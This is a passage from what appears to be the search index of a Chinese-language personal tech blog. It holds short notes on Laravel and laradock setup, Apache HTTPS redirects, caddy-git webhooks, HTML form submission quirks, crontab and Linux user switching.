class=\"line\">DB_HOST=127.0.0.1</span><br><span class=\"line\">DB_PORT=33060</span><br><span class=\"line\">DB_DATABASE=homestead</span><br><span class=\"line\">DB_USERNAME=root</span><br><span class=\"line\">DB_PASSWORD=root</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<p>請順便建立你命名DB名稱(DB_DATABASE)</p>\n<p>4.在laravel 執行下面指令<br><code>php artisan migrate</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">SQLSTATE[42S02]: Base table or view not found: 1146 Table &apos;homestead.tasks&apos; doesn&apos;t exist (SQL: select * from `tasks` order by `created_at` desc) search►</span><br></pre></td></tr></table></figure>\n<p>出現以上錯誤代表沒執行<code>php artisan migrate</code></p>\n<p>參考來源<br><a href=\"https://github.com/laravel-dojo/wagon/releases\" target=\"_blank\" rel=\"noopener\">Releases · laravel-dojo/wagon</a><br><a href=\"https://laracasts.com/discuss/channels/eloquent/what-step-am-i-missing?page=0\" target=\"_blank\" rel=\"noopener\">What step am I missing?</a></p>\n","categories":["Laravel"],"tags":["PHP","wagon","Laravel"]},{"title":"Raspberry PI  Git Webhook...","url":"/blog/2017/11/06/logdown/2017-11-06-3305711/","content":"<p>要做blog移轉，筆記先存檔…<br>不過這篇可能不用實作了</p>\n<p><a href=\"http://thesociablegeek.com/node/github-continuous-deployment-to-a-raspberry-pi/\" target=\"_blank\" rel=\"noopener\">http://thesociablegeek.com/node/github-continuous-deployment-to-a-raspberry-pi/</a><br><a href=\"http://thesociablegeek.com/node/github-continuous-deployment-to-a-raspberry-pi/\" target=\"_blank\" rel=\"noopener\">GitHub Continuous deployment to a Raspberry Pi | The Sociable Geek</a><br><a href=\"http://blog.roachking.net/blog/2013/05/01/localtunnel/\" target=\"_blank\" rel=\"noopener\">Localtunnel - 分享 Localhost Web Server - 蟑螂窩</a></p>\n","categories":["Linux"]},{"title":"Apache 80 port 網址自動轉443 port方法","url":"/blog/2017/11/09/logdown/2017-11-09-3423821/","content":"<p>上次動物機設定TSL有做過設定<br>不過網路上發現有一個方法<br>先記一下筆記</p>\n<a id=\"more\"></a>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">NameVirtualHost *:80</span><br><span class=\"line\">&lt;VirtualHost *:80&gt;</span><br><span class=\"line\">   ServerName www.example.com</span><br><span class=\"line\">   Redirect / https://secure.example.com/</span><br><span class=\"line\">&lt;/VirtualHost&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;VirtualHost _default_:443&gt;</span><br><span class=\"line\">   ServerName secure.example.com</span><br><span class=\"line\">   DocumentRoot /usr/local/apache2/htdocs</span><br><span class=\"line\">   SSLEngine On</span><br><span class=\"line\"># etc...</span><br><span class=\"line\">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure>\n<p>在80設定檔可以看到 <code>Redirect / https://secure.example.com/</code>可以導到80 port<br>但好像不能像rewrite_mod方法導到一樣頁面<br>在這邊筆記一下。</p>\n<p>=====</p>\n<p>另外一個，rewrite_mod之前有記錄過…<br>Raspberry PI 自動設定Let’s Encrypt！ TLS(SSL 憑證)</p>\n<p>參考來源：<br><a href=\"https://wiki.apache.org/httpd/RedirectSSL\" target=\"_blank\" rel=\"noopener\">NameVirtualHost</a></p>\n","categories":["Apache"],"tags":["Apache","TLS","rewrite_mod"]},{"title":"laradock架設筆記","url":"/blog/2017/11/18/logdown/2017-11-18-3523831/","content":"<p>試試用 Docker 來記記 laravel 筆記</p>\n<a id=\"more\"></a>\n<ol>\n<li>建置 laravel 專案<br>composer 建立</li>\n</ol>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">composer global require <span class=\"string\">\"laravel/installer\"</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">laravel new blog</span><br></pre></td></tr></table></figure>\n<p>或</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">composer create-project --prefer-dist laravel/laravel blog</span><br></pre></td></tr></table></figure>\n<p>沒有安裝 composer 可以直接 git clone 下來</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">git <span class=\"built_in\">clone</span> http://github.com/laravel/laravel</span><br></pre></td></tr></table></figure>\n<ol start=\"2\">\n<li>建立 laradock 在 laravel 目錄下面</li>\n</ol>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">git submodule add https://github.com/Laradock/laradock.git</span><br></pre></td></tr></table></figure>\n<ol start=\"3\">\n<li>在 laradocker 目錄下複製範例 example-env，命名為.env</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">cp env-example .env</span><br></pre></td></tr></table></figure>\n<ol start=\"4\">\n<li>執行 docker</li>\n</ol>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker-compose up -d nginx mysql</span><br></pre></td></tr></table></figure>\n<ol start=\"5\">\n<li>設置 laravel 目錄，env 設定 (PS:這邊的 env 跟 docker env 不一樣，不要搞錯了)</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker-compose exec workspace bash</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ root@workspace:/var/www# composer install</span><br><span class=\"line\">$ root@workspace:/var/www# cp .env.example .env</span><br><span class=\"line\">$ root@workspace:/var/www# php artisan key:generate</span><br><span class=\"line\">$ root@workspace:/var/www# exit</span><br><span class=\"line\">$root@server:~/laravel/laradock# cd ..</span><br><span class=\"line\">$root@server:~/laravel# sudo chmod -R 777 storage bootstrap/cache</span><br></pre></td></tr></table></figure>\n<ol start=\"6\">\n<li>設定 laravel 裡的.env DB 設定</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">DB_DATABASE=default</span><br><span class=\"line\">DB_USERNAME=default</span><br><span class=\"line\">DB_PASSWORD=secret</span><br></pre></td></tr></table></figure>\n<p>請參照你的 laradocker DB 帳號、密碼去做設定<br>127.0.0.1 請改成 mysql or mariadb (依照 DB 選譯)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">MYSQL_DATABASE=default</span><br><span class=\"line\">MYSQL_USER=default</span><br><span class=\"line\">MYSQL_PASSWORD=secret</span><br></pre></td></tr></table></figure>\n<p>已經測試過在 play with docker 可以跑了</p>\n<p>2019-06-09<br>使用 MySQL 8.0 由於登入 caching_sha2_password<br><a href=\"https://github.com/laradock/laradock/issues/2043\" target=\"_blank\" rel=\"noopener\">unable to connect to MySQL after upgrade to latest (8) version · Issue #2043 · laradock/laradock</a><br><a href=\"https://laradock.io/documentation/#change-the-mysql-version\" target=\"_blank\" rel=\"noopener\">Documentation - Laradock</a><br><a href=\"https://github.com/laradock/laradock/issues/1392#issuecomment-383631421\" target=\"_blank\" rel=\"noopener\">SQLSTATE[HY000] [2054] The server requested authentication method unknown to the client · Issue #1392 · laradock/laradock</a></p>\n<p>假如 DB 沒限制的話，我推薦改使用 mariaDB<br>快速解決</p>\n<p>參考來源<br><a href=\"https://laravel.tw/docs/5.3/installation\" target=\"_blank\" rel=\"noopener\">https://laravel.tw/docs/5.3/installation</a><br><a href=\"http://laradock.io/guides/#set-up-your-laravel-project\" target=\"_blank\" rel=\"noopener\">http://laradock.io/guides/#set-up-your-laravel-project</a><br>不專業網管筆記: [ 練習] 使用 Laradock 建立 Laravel 開發環境 (舊版說明)<br>t301000.blogspot.com/2017/01/laradock-laravel.html<br><a href=\"https://learnku.com/articles/5893/laradock-database-connection-problem\" target=\"_blank\" rel=\"noopener\">laradock 数据库连接问题 | Laravel China 社区</a><br><a href=\"https://medium.com/@yfancc20/laradock-%E8%BC%95%E9%87%8F-laravel-%E7%92%B0%E5%A2%83%E7%9A%84%E5%98%97%E8%A9%A6-%E5%B8%B8%E8%A6%8B%E9%8C%AF%E8%AA%A4-2fc6f0c21433\" target=\"_blank\" rel=\"noopener\">Laradock — Laravel + Docker 輕量級環境打造 – Yifan Wu – Medium</a></p>\n","categories":["Laravel"],"tags":["docker","PHP","Laravel"]},{"title":"[SQL]比較null不能用等於","url":"/blog/2017/11/18/logdown/2017-11-18-3523839/","content":"<p>用is比較null，不能用=</p>\n<p><a href=\"https://www.ptt.cc/bbs/Database/M.1371619944.A.7BC.html\" target=\"_blank\" rel=\"noopener\">Re: [SQL ] 是否避免null值 - 看板 Database - 批踢踢實業坊</a><br><a href=\"https://www.ptt.cc/bbs/Database/M.1369235271.A.6B0.html\" target=\"_blank\" rel=\"noopener\">Re: [SQL ] 是否避免null值 - 看板 Database - 批踢踢實業坊</a></p>\n","categories":["SQL"],"tags":["sql"]},{"title":"用caddy-git使用webhook初體驗","url":"/blog/2017/11/26/logdown/2017-11-26-3865744/","content":"<p>最近想自動化樹莓派同步git server上面的東西<br>有找到要使用webhook<br>目前樹莓派上面沒有啟用fastcgi東西<br>上次有看到caddy他還有類似webhook這玩意<br>就玩一下，筆記<br><a href=\"https://github.com/abiosoft/caddy-git\" target=\"_blank\" rel=\"noopener\">abiosoft/caddy-git: git middleware for Caddy</a><br><a id=\"more\"></a></p>\n<p>首先就先用gitea來建立server測試<br>執行caddy的時候<br>會git pull動作<br>caddy-git文件寫預設1小時會git pull動作<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">localhost:80</span><br><span class=\"line\">git &#123;</span><br><span class=\"line\">\trepo     http://localhost:3000/root/test.git</span><br><span class=\"line\">\tpath     C:/test/</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>要設定多久要git pull 可以設定<br><code>interval        60</code>   是1分鐘<code>git pull</code>動作<br>要加入webhook<br>只要設定<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">localhost:80</span><br><span class=\"line\">git &#123;</span><br><span class=\"line\">    \trepo     http://localhost:3000/root/test.git</span><br><span class=\"line\">    \tpath     C:/test/</span><br><span class=\"line\">\t    #interval        60</span><br><span class=\"line\">      hook /webhook test</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>可以用<code>#</code>當注解<br>hook設定也想當簡單<br><code>hook /webhook secret-password</code></p>\n<p>當然gitea設定webhook也很簡單<br>[img]<a href=\"https://i.imgur.com/5pFYK8Z.png[/img]\" target=\"_blank\" rel=\"noopener\">https://i.imgur.com/5pFYK8Z.png[/img]</a><br>這樣就搞定了</p>\n<p>這之後我也有找一些webhook工具<br>但是都沒有看到apache相關webhook東西</p>\n<p><a href=\"https://github.com/NetEaseGame/git-webhook\" target=\"_blank\" rel=\"noopener\">NetEaseGame/git-webhook: 使用 Python Flask + SQLAchemy + Celery + Redis + React 开发的用于迅速搭建并使用 WebHook 进行自动化部署和运维，支持 Github / GitLab / Gogs / GitOsc。</a><br><a href=\"http://jerryzou.com/posts/webhook-practice/\" target=\"_blank\" rel=\"noopener\">Webhook 实践 —— 自动部署 | 咀嚼之味</a><br><a href=\"https://medium.com/cowbear-coder/raspberry-pi-raspbian-jessie-%E5%AE%89%E8%A3%9D%E8%A8%AD%E5%AE%9A-15599a6785e9\" target=\"_blank\" rel=\"noopener\">Raspberry Pi Raspbian Jessie 安裝設定 – 靠der Cowder – Medium</a></p>\n<p>原本想試試<a href=\"https://github.com/rvagg/github-webhook-handler\" target=\"_blank\" rel=\"noopener\">rvagg/github-webhook-handler: Node.js web handler / middleware for processing GitHub Webhooks</a><br>不過對systemd還不是很熟<br>不知道要怎麼設定</p>\n<p>最後，我覺得直接crontab設定1小時做git pull動作<br>因為我的需求也不需要很及時做更新</p>\n<p>這應該就能解決我的需求<br>待下次作筆記</p>\n<ul>\n<li><a href=\"http://ibookmen.blogspot.com/2010/11/unix-2.html\" target=\"_blank\" rel=\"noopener\">孤島日誌: Unix 重新導向跟 2&gt;&amp;1</a></li>\n<li><a href=\"https://www.phpini.com/linux/dev-null-2-and-1-meanning\" target=\"_blank\" rel=\"noopener\">“&gt; /dev/null 2&gt;&amp;1” 的意思 – Linux 技術手札</a></li>\n<li><a href=\"https://moto.debian.tw/viewtopic.php?f=11&amp;t=17208\" target=\"_blank\" rel=\"noopener\">摩托學園討論區 • 檢視主題 - [分享] 研究 2&gt;&amp;1 後的一點點心得</a></li>\n</ul>\n","categories":["Git"],"tags":["webhook","caddy","caddy-git"]},{"title":"Form 送出可能沒注意到的事情(select地雷)","url":"/blog/2017/11/25/logdown/2017-11-25-form-forms-send-out-things-that-might-not-have-been-noticed-select-mines/","content":"<p>因為最近程式需要從IE8到IE11相容易改版<br>今天同事問我他跟我說他最近網路遇到的怪事<br>IE8做submit可以接收到多個select資料<br>但是IE11確不行….<br>後來發現這真的不是很多人知道的東西<br>做一下筆記<br><a id=\"more\"></a></p>\n<p>#select 地雷</p>\n<p>##value設定沒有options裡面的值</p>\n<p>當設定select.value=’ffff’，但是select沒有內容，select將會為””空字串<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">The value IDL attribute, on getting, must return the value of the first option element in the list of options in tree order that has its selectedness set to true, if any. If there isn&apos;t one, then it must return the empty string.</span><br></pre></td></tr></table></figure></p>\n<p><a href=\"https://html.spec.whatwg.org/multipage/form-elements.html#dom-select-value\" target=\"_blank\" rel=\"noopener\">HTML Standard</a></p>\n<p>##select設定沒有內容值，submit不會送出去<br><strong>如上面的「value設定沒有options裡面的值」</strong><br>不會送出去<br>可參考第5點<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">If the field element is a select element, then for each option element in the select element&apos;s list of options whose selectedness is true and that is not disabled, append an entry to the form data set with the name as the name, the value of the option element as the value, and type as the type.</span><br></pre></td></tr></table></figure></p>\n<p><a href=\"https://html.spec.whatwg.org/multipage/form-control-infrastructure.html#concept-form-submit\" target=\"_blank\" rel=\"noopener\">HTML Standard</a></p>\n<p>##option沒設定value，預設value為text名稱</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">select</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">option</span>&gt;</span>test<span class=\"tag\">&lt;/<span class=\"name\">option</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">select</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>上面沒有設定value預設會以text內容為主(上面option value為test)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">The value attribute provides a value for element. The value of an option element is the value of the value content attribute, if there is one, or, if there is not, the value of the element&apos;s text IDL attribute.</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://html.spec.whatwg.org/multipage/form-elements.html#dom-option-value\" target=\"_blank\" rel=\"noopener\">HTML Standard</a></p>\n<h2 id=\"checkbox-radio-地雷\"><a href=\"#checkbox-radio-地雷\" class=\"headerlink\" title=\"checkbox radio 地雷\"></a>checkbox radio 地雷</h2><p>打勾(v)確沒有設定value值，value預設傳on<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Otherwise, if the field element is an input element whose type attribute is in the Checkbox state or the Radio Button state, then:</span><br><span class=\"line\">    If the field element has a value attribute specified, then let value be the value of that attribute; otherwise, let value be the string &quot;on&quot;.</span><br><span class=\"line\">    Append an entry to the form data set with name as the name, value as the value, and type as the type.</span><br></pre></td></tr></table></figure></p>\n<p>當沒選擇檔案submit情況<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Otherwise, if the field element is an input element whose type attribute is in the File Upload state, then for each file selected in the input element, append an entry to the form data set with the name as the name, the file (consisting of the name, the type, and the body) as the value, and type as the type. If there are no selected files, then append an entry to the form data set with the name as the name, the empty string as the value, and application/octet-stream as the type.</span><br></pre></td></tr></table></figure></p>\n<p>這有遇到過，但也沒找到相關文件<br>原來文件有寫這個</p>\n<p>#結論<br>IE8可以跑多個select原因<br>是因為IE8 bug關係</p>\n<p>IE11就照原本W3C文件規範XD<br>這次真的了解很多東西</p>\n","categories":["HTML"],"tags":["HTML","select","地雷","Form"]},{"title":"electron 新手做Tray通知(以electron-chat-app-demo為例)","url":"/blog/2017/09/19/logdown/2017-09-19-2496270/","content":"<p>要做blog移轉，筆記先存檔…</p>\n<a id=\"more\"></a>\n<p>Electron 中文文檔<br><a href=\"https://dl.lianst.com/ebook/Electron%20%E4%B8%AD%E6%96%87%E6%96%87%E6%A1%A3.pdf\" target=\"_blank\" rel=\"noopener\">https://dl.lianst.com/ebook/Electron%20%E4%B8%AD%E6%96%87%E6%96%87%E6%A1%A3.pdf</a></p>\n<p><a href=\"http://zhuxindaba.github.io/2016/07/05/Electron/desktop_environment_integration/\" target=\"_blank\" rel=\"noopener\">http://zhuxindaba.github.io/2016/07/05/Electron/desktop_environment_integration/</a></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> &#123;Menu, Tray&#125; = <span class=\"built_in\">require</span>(<span class=\"string\">'electron'</span>).remote</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> trayIcon = path.join(__dirname, <span class=\"string\">'icons/icon-16x16.png'</span>);</span><br><span class=\"line\"><span class=\"keyword\">const</span> tray = <span class=\"keyword\">new</span> Tray(trayIcon);</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://www.christianengvall.se/electron-packager-tutorial/\" target=\"_blank\" rel=\"noopener\">https://www.christianengvall.se/electron-packager-tutorial/</a><br><a href=\"https://github.com/electron/electron/issues/7657\" target=\"_blank\" rel=\"noopener\">https://github.com/electron/electron/issues/7657</a></p>\n","categories":["electron"]},{"title":"Crontab 執行特定目錄","url":"/blog/2017/12/12/logdown/2017-12-12-crontab-execution-specific-directory/","content":"<figure class=\"highlight plain\"><figcaption><span>-l</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">50 * * * * cd /home/me/.flexget &amp;&amp; sh /home/me/.flexget/gitpull.sh &gt;/dev/null 2&gt;&amp;1</span><br></pre></td></tr></table></figure>\n<p>假如前面沒有做cd動作，執行目錄不會是在相同目錄<br>在此筆記，以後就不用查了<br>直接看筆記XD</p>\n<a id=\"more\"></a>\n<p>在鳥哥看到<code>12.2.2 script 的執行方式差異 (source, sh script, ./script)</code><br>相信可能跟這個也很有關係</p>\n<p><a href=\"https://moto.debian.tw/viewtopic.php?f=11&amp;t=17208\" target=\"_blank\" rel=\"noopener\">摩托學園討論區 • 檢視主題 - [分享] 研究 2&gt;&amp;1 後的一點點心得</a><br>也看到<code>&gt;/dev/null</code>執行正確不會東西，但是執行錯誤會顯示在console上面<br>但是<code>2&gt;&amp;1</code>會把錯誤資訊鳥在/dev/null (前提看你前面寫什麼)<br>詳細看裡面教學</p>\n<p><strong>2020-04-25</strong></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 輸出結果也不太一樣</span></span><br><span class=\"line\">ls  &gt; dirlist  2&gt;&amp;1</span><br><span class=\"line\">ls 2&gt;&amp;1 &gt; dirlist</span><br><span class=\"line\"><span class=\"comment\"># 對於第二種情況，標準錯誤只是使用了標準輸出的文件表項，而標準輸出使用了 dirlist 的文件表項。</span></span><br></pre></td></tr></table></figure>\n<p>參考:<a href=\"https://gowa.club/Linux-Unix/Bash%E4%B8%AD%E7%9A%84IO%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91.html\" target=\"_blank\" rel=\"noopener\">Bash中的IO與重定向 | 退思園</a></p>\n<p><a href=\"https://unix.stackexchange.com/questions/38951/what-is-the-working-directory-when-cron-executes-a-job\" target=\"_blank\" rel=\"noopener\">What is the ‘working directory’ when cron executes a job? - Unix &amp; Linux Stack Exchange</a><br><a href=\"https://stackoverflow.com/questions/8899737/crontab-run-in-directory\" target=\"_blank\" rel=\"noopener\">unix - Crontab - Run in directory - Stack Overflow</a><br><a href=\"http://linux.vbird.org/linux_basic/0340bashshell-scripts.php#some_ex_run\" target=\"_blank\" rel=\"noopener\">鳥哥的 Linux 私房菜 – 第十二章、學習 Shell Scripts</a><br><a href=\"https://moto.debian.tw/viewtopic.php?f=11&amp;t=17208\" target=\"_blank\" rel=\"noopener\">摩托學園討論區 • 檢視主題 - [分享] 研究 2&gt;&amp;1 後的一點點心得</a></p>\n<h1 id=\"crontab-Jitter\"><a href=\"#crontab-Jitter\" class=\"headerlink\" title=\"crontab Jitter\"></a>crontab Jitter</h1><p><a href=\"http://blog.itpub.net/69945560/viewspace-2670150/\" target=\"_blank\" rel=\"noopener\">APScheduler的使用详解_ITPUB博客</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\"></span><br><span class=\"line\">maxdelay=$((14*60))  <span class=\"comment\"># 14 hours from 9am to 11pm, converted to minutes</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> ((i=1; i&lt;=20; i++)); <span class=\"keyword\">do</span></span><br><span class=\"line\">    delay=$((<span class=\"variable\">$RANDOM</span>%maxdelay)) <span class=\"comment\"># pick an independent random delay for each of the 20 runs</span></span><br><span class=\"line\">    (sleep $((delay*60)); /path/to/phpscript.php) &amp; <span class=\"comment\"># background a subshell to wait, then run the php script</span></span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br></pre></td></tr></table></figure>\n<p><a href=\"https://stackoverflow.com/questions/9049460/cron-jobs-and-random-times-within-given-hours\" target=\"_blank\" rel=\"noopener\">bash - Cron jobs and random times, within given hours - Stack Overflow</a></p>\n<p><a href=\"https://www.askbjoernhansen.com/2007/11/19/space_out_cronjobs.html\" target=\"_blank\" rel=\"noopener\">Avoid the “top of the minute problem” - space out your cronjobs - Ask Bjørn Hansen</a></p>\n<p><a href=\"https://servercheck.in/blog/little-jitter-can-help-evening-out-distributed\" target=\"_blank\" rel=\"noopener\">A little jitter can help (evening out distributed cron-based tasks) | Server Check.in</a></p>\n<p><a href=\"https://servercheck.in/blog/little-jitter-can-help-evening-out-distributed\" target=\"_blank\" rel=\"noopener\">A little jitter can help (evening out distributed cron-based tasks) | Server Check.in</a></p>\n","categories":["Linux"],"tags":["crontab"]},{"title":"Caddy Web Server初次小體驗","url":"/blog/2017/11/26/logdown/2017-11-26-caddy-first-small-experience/","content":"<p>這是簡單caddy架設筆記<br>在FB上看到有人推這個<br>會自動建立 Let’s Encrypt 憑證<br>不需要設定<br>就很好奇玩了一下</p>\n<a id=\"more\"></a>\n<p>在沒有設定Caddyfile<br>port預設為2015<br>支援日文、簡體中文、韓文檔案下載<br>哈，不知道能不能當hfs</p>\n<p>在同目錄新增<code>Caddyfile</code><br>官網文件<a href=\"https://caddyserver.com/docs/caddyfile#lexical-syntax\" target=\"_blank\" rel=\"noopener\">The Caddyfile Syntax</a><br>設定感覺不難</p>\n<p>內容如下<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">localhost:80</span><br><span class=\"line\">root .</span><br><span class=\"line\">gzip</span><br><span class=\"line\">log</span><br><span class=\"line\">browse</span><br></pre></td></tr></table></figure></p>\n<p>browse可幾乎同等於autoindex，可惜沒有預設設定排序<br>不過會記憶選擇後的排序</p>\n<p>可以指定<code>Caddyfile</code>目錄<br><code>caddy -conf C:\\Users\\xxx\\Desktop\\caddy\\Caddyfile</code></p>\n<p>短時間不知道能不能取代我的apache<br>不過目前懶的做更換</p>\n<p>還發現有caddy-git這個東西<br>改天做研究</p>\n","categories":["Linux"],"tags":["caddy","web server"]},{"title":"Exit Codes 程式回傳錯誤碼","url":"/blog/2017/12/12/logdown/2017-12-12-exit-codes-program-return-error-code/","content":"<p>看到上一篇<a href=\"http://malagege.logdown.com/posts/4442412-crontab-execution-specific-directory\" target=\"_blank\" rel=\"noopener\">Crontab 執行特定目錄 « 進擊的程式新手</a><br>我就想想我寫的程式如何寫出err訊息<br>然後在Bitbucket測試程式可以跑</p>\n<p>後來Google到<a href=\"https://www.shellscript.sh/exitcodes.html\" target=\"_blank\" rel=\"noopener\">Exit Codes - Shell Scripting Tutorial</a><br>原來每一個程式語言有類似<code>System.exit(int i)</code>這個東西<br>0表示程式正常，其他值表式程式有錯誤</p>\n<p>這時候zsh前面會有x表示</p>\n<p><a href=\"https://read01.com/zh-tw/dxO3gQ.html\" target=\"_blank\" rel=\"noopener\">理解 Exit Code 並學會如何在 Bash 腳本中使用 - 壹讀</a><br><a href=\"https://www.shellscript.sh/exitcodes.html\" target=\"_blank\" rel=\"noopener\">Exit Codes - Shell Scripting Tutorial</a></p>\n","categories":["程式心法"],"tags":["exit code","system.exit"]},{"title":"[Linux]切換使用者筆記","url":"/blog/2017/12/13/logdown/2017-12-13-linux-switch-user-notes/","content":"<p>最近忘記這篇<a href=\"http://malagege.logdown.com/posts/2131881\" target=\"_blank\" rel=\"noopener\">Controb排程設定 « 進擊的程式新手</a>之前下的指令要怎麼用<br>所以記錄一下<br>以免在次花一堆時間查詢<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo -u debian-transmission crontab -e</span><br></pre></td></tr></table></figure></p>\n<a id=\"more\"></a>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@study ~]# su [-lm] [-c 指令] [username]</span><br><span class=\"line\">選項與參數：</span><br><span class=\"line\">-   ：單純使用 - 如『 su - 』代表使用 login-shell 的變數檔案讀取方式來登入系統；</span><br><span class=\"line\">      若使用者名稱沒有加上去，則代表切換為 root 的身份。</span><br><span class=\"line\">-l  ：與 - 類似，但後面需要加欲切換的使用者帳號！也是 login-shell 的方式。</span><br><span class=\"line\">-m  ：-m 與 -p 是一樣的，表示『使用目前的環境設定，而不讀取新使用者的設定檔』</span><br><span class=\"line\">-c  ：僅進行一次指令，所以 -c 後面可以加上指令喔！</span><br></pre></td></tr></table></figure>\n<p>先<code>sudo -i</code>進入root權限，再下<code>su -m debian-transmission</code>指令就可以進去shell介面</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@study ~]# sudo [-b] [-u 新使用者帳號]</span><br><span class=\"line\">選項與參數：</span><br><span class=\"line\">-b  ：將後續的指令放到背景中讓系統自行執行，而不與目前的 shell 產生影響</span><br><span class=\"line\">-u  ：後面可以接欲切換的使用者，若無此項則代表切換身份為 root 。</span><br></pre></td></tr></table></figure>\n<p><strong>2019-10-24</strong></p>\n<h2 id=\"切換使用者-帳號-方法\"><a href=\"#切換使用者-帳號-方法\" class=\"headerlink\" title=\"切換使用者(帳號)方法\"></a>切換使用者(帳號)方法</h2><blockquote>\n<p>先<code>sudo -i</code>進入root權限，再下<code>su -m debian-transmission</code>指令就可以進去shell介面</p>\n</blockquote>\n<p>除了這招，最近 docker 執行 cmd 的方法讓我想到一個方法<code>sudo -u debian-transmission bash</code></p>\n<h2 id=\"newgrp-groups\"><a href=\"#newgrp-groups\" class=\"headerlink\" title=\"newgrp, groups\"></a>newgrp, groups</h2><p>之前有紀錄 <a href=\"https://malagege.github.io/blog/2014/09/15/logdown/2014-09-15-linux-use-usermod-to-modify-the-users-parameters-and-data/\">Linux 利用 usermod 修改使用者的參數和資料 | 程式狂想筆記</a><br>但當時還菜<del>現在也很菜</del><br>沒有紀錄很完整</p>\n<p>例如剛剛安裝完 docker<br>只能用 root 方法去執行<br>如果想把一般 user 使用 docker 方法，就把 user 加到 docker 使用者</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo usermod -G docker -a testuser</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://ephrain.net/docker-%E4%BD%BF%E7%94%A8%E9%9D%9E-root-%E6%AC%8A%E9%99%90%E4%BE%86%E5%9F%B7%E8%A1%8C-docker-client/\" target=\"_blank\" rel=\"noopener\">[Docker] 使用非 root 權限來執行 docker client | EPH 的程式日記</a><br>例如這個</p>\n<p>要重開 bash 或 <code>newgrp docker</code>可以使用<br><del>當年就是看太快，想說奇怪怎麼沒用</del></p>\n<p>詳細講一下 newgrp docker，其實我覺得他有點向開一個新 bash<br>如果很難懂看下面應該很好懂<br>groups 第一個就是目前群組</p>\n<blockquote>\n<p>newgrp 切換群組<br>此為帳號和群組管理相關的指令, newgrp 指令類似 login 以相同的帳號登入另一個群組,以指令 exit 又回到原群組。<br>$ groups ←列出有那些有群組成員<br>frank marketing ←有效群組(effective group)目前為〝frank〞(列在前的為有效群組)<br>$ newgrp marketing ←登入〝marketing〞群組<br>$ groups ←驗證有無登入另一個群組<br>marketing frank ←有效群組變〝marketing〞了<br>$ exit ←回原群組<br>$ groups ←驗證看看<br>frank marketing<br>參考 <a href=\"http://www.polish.url.tw/inst/newgrp.html\" target=\"_blank\" rel=\"noopener\">阿旺的 Linux 開竅手冊 newgrp 指令</a></p>\n</blockquote>\n<p>再看<a href=\"http://c.biancheng.net/view/860.html\" target=\"_blank\" rel=\"noopener\">Linux newgrp命令用法详解：切换用户的有效组</a>圖 1 newgrp 切換初始組程序運行過程圖<br>應該可以更清楚了解</p>\n<h2 id=\"我想的管理帳號方法\"><a href=\"#我想的管理帳號方法\" class=\"headerlink\" title=\"我想的管理帳號方法\"></a>我想的管理帳號方法</h2><p>Transmission 會建立 debian-transmission 帳號。<br>Docker 會建立 docker 帳號。</p>\n<p>所以一個應用程式獨立一個帳號<br>然後利用加群組方式授權帳號<br>可以算是一個管理模式<br>這樣不用再注意777的問題</p>\n<p>參考來源:<br><a 